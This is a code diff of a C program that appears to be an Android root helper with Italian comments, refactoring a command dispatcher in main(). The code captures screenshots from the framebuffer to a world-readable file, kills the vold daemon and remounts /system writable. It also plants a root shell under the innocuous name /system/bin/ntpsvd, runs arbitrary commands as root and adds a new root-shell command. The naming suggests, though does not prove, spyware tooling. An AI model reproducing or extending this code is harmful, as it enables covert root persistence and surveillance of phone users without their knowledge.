@@ -40,44 +40,45 @@ int main(int argc, char** argv) {
 	int i;
 	setgod();
 
-	if (argc == 2) {
-		// Cattura uno screenshot
-		if (strcmp(argv[1], "fb") == 0) {
-			char* filename = "/data/data/com.android.service/files/frame";
+	if (argc < 2) 
+		return 0;
 
-			copy("/dev/graphics/fb0", filename);
-			chmod("/data/data/com.android.service/files/frame", 0666);
-		} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
-			unsigned int pid;
+	// Cattura uno screenshot
+	if (strcmp(argv[1], "fb") == 0) {
+		char* filename = "/data/data/com.android.service/files/frame";
+
+		copy("/dev/graphics/fb0", filename);
+		chmod("/data/data/com.android.service/files/frame", 0666);
+	} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
+		unsigned int pid;
 		
-			LOG("Killing VOLD\n");
+		LOG("Killing VOLD\n");
 
-			for (i = 0; i < 2; i++) {
-				pid = getProcessId("vold");
+		for (i = 0; i < 2; i++) {
+			pid = getProcessId("vold");
 
-				if (pid) {
-					kill(getProcessId("vold"), SIGKILL);
-					sleep(2);
-				}	
-			}
-		} else if (strcmp(argv[1], "reb") == 0) { // Reboot
-			LOG("Rebooting...\n");
-
-			sync_reboot();
-		} else if (strcmp(argv[1], "blr") == 0) { // Monta /system in READ_ONLY
-			remount("/system", MS_RDONLY);
-		} else if (strcmp(argv[1], "blw") == 0) { // Monta /system in READ_WRITE
-			remount("/system", 0);
-		} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
-			copy_root("/system", "/system/bin/ntpsvd");
-		} else if (strcmp(argv[1], "sd") == 0) {
-			my_mount("/mnt/sdcard");
-		} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
-			return setgod();
-		} else if (strcmp(argv[1], "qzx") == 0) { // Eseguiamo la riga passataci
-			return system(argv[2]);
+			if (pid) {
+				kill(getProcessId("vold"), SIGKILL);
+				sleep(2);
+			}	
 		}
-	} else {
+	} else if (strcmp(argv[1], "reb") == 0) { // Reboot
+		LOG("Rebooting...\n");
+
+		sync_reboot();
+	} else if (strcmp(argv[1], "blr") == 0) { // Monta /system in READ_ONLY
+		remount("/system", MS_RDONLY);
+	} else if (strcmp(argv[1], "blw") == 0) { // Monta /system in READ_WRITE
+		remount("/system", 0);
+	} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
+		copy_root("/system", "/system/bin/ntpsvd");
+	} else if (strcmp(argv[1], "sd") == 0) {
+		my_mount("/mnt/sdcard");
+	} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
+		return setgod();
+	} else if (strcmp(argv[1], "qzx") == 0) { // Eseguiamo la riga passataci
+		return system(argv[2]);
+	} else if (strcmp(argv[1], "qzs") == 0) { // Eseguiamo una root shell
 		const char * shell = "/system/bin/sh";
 		LOG("Starting shell\n");
 
